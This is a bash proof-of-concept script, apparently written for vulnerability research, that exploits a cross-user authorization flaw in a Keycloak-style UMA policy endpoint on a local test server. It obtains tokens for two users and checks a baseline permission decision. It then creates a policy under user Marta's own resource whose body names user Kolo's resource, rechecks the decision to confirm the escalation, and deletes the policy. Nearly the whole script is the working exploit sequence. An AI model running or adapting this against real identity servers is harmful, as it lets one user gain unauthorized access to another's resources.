#!/usr/bin/env bash
set -u
base=http://127.0.0.1:8080
realm=anypoc
client=resource-server-test
secret=secret

get_token() {
  local user=$1 pass=$2 out=$3
  curl -sS -X POST "$base/realms/$realm/protocol/openid-connect/token" \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    --data-urlencode grant_type=password \
    --data-urlencode client_id="$client" \
    --data-urlencode client_secret="$secret" \
    --data-urlencode username="$user" \
    --data-urlencode password="$pass" \
    -o "$out"
}

get_token marta password /tmp/marta-token.json
get_token kolo password /tmp/kolo-token.json

echo 'Marta token response:'
jq '{token_type,scope,expires_in,access_token:(.access_token|split(".")|.[1]|@base64d|fromjson|{preferred_username,sub,azp,scope,resource_access})}' /tmp/marta-token.json
echo 'Kolo token response:'
jq '{token_type,scope,expires_in,access_token:(.access_token|split(".")|.[1]|@base64d|fromjson|{preferred_username,sub,azp,scope,resource_access})}' /tmp/kolo-token.json

mt=$(jq -r .access_token /tmp/marta-token.json)
echo 'Marta policy list:'
curl -sS -D - "$base/realms/$realm/authz/protection/uma-policy" \
  -H "Authorization: Bearer $mt" -o /tmp/marta-policies.json
cat /tmp/marta-policies.json
echo

echo 'Marta resource list:'
curl -sS -D - "$base/realms/$realm/authz/protection/resource_set" \
  -H "Authorization: Bearer $mt" -o /tmp/marta-resources.json
cat /tmp/marta-resources.json
echo

echo 'Marta baseline UMA decision for Kolo resource:'
curl -sS -D - -X POST "$base/realms/$realm/protocol/openid-connect/token" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode grant_type=urn:ietf:params:oauth:grant-type:uma-ticket \
  --data-urlencode client_id="$client" \
  --data-urlencode client_secret="$secret" \
  --data-urlencode response_mode=decision \
  --data-urlencode audience="$client" \
  --data-urlencode permission='291c1f42-cb7a-46cd-be79-d6851533d448#Scope A' \
  -H "Authorization: Bearer $mt" -o /tmp/marta-baseline-decision.json
cat /tmp/marta-baseline-decision.json
echo

echo 'Marta exploit policy creation: route is Marta resource, representation references Kolo resource:'
curl -sS -D /tmp/marta-create-headers.txt -X POST "$base/realms/$realm/authz/protection/uma-policy/b1385043-3cfc-4d4c-9aac-5c5afe07e06e" \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $mt" \
  --data '{"name":"marta-cross-user-poc","description":"cross-user authorization PoC","scopes":["Scope A"],"users":["marta"],"resources":["b1385043-3cfc-4d4c-9aac-5c5afe07e06e","291c1f42-cb7a-46cd-be79-d6851533d448"]}' \
  -o /tmp/marta-created-policy.json
cat /tmp/marta-create-headers.txt
cat /tmp/marta-created-policy.json
echo

echo 'Marta policy list after creation:'
curl -sS -D - "$base/realms/$realm/authz/protection/uma-policy" \
  -H "Authorization: Bearer $mt" -o /tmp/marta-policies-after.json
cat /tmp/marta-policies-after.json
echo

echo 'Marta UMA decision after exploit:'
curl -sS -D - -X POST "$base/realms/$realm/protocol/openid-connect/token" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode grant_type=urn:ietf:params:oauth:grant-type:uma-ticket \
  --data-urlencode client_id="$client" \
  --data-urlencode client_secret="$secret" \
  --data-urlencode response_mode=decision \
  --data-urlencode audience="$client" \
  --data-urlencode permission='291c1f42-cb7a-46cd-be79-d6851533d448#Scope A' \
  -H "Authorization: Bearer $mt" -o /tmp/marta-after-decision.json
cat /tmp/marta-after-decision.json
echo

policy_id=$(jq -r '.id // empty' /tmp/marta-created-policy.json)
if [ -n "$policy_id" ]; then
  echo "Cleanup: deleting policy $policy_id through Marta's policy endpoint"
  curl -sS -D - -X DELETE "$base/realms/$realm/authz/protection/uma-policy/$policy_id" \
    -H "Authorization: Bearer $mt"
  echo
fi
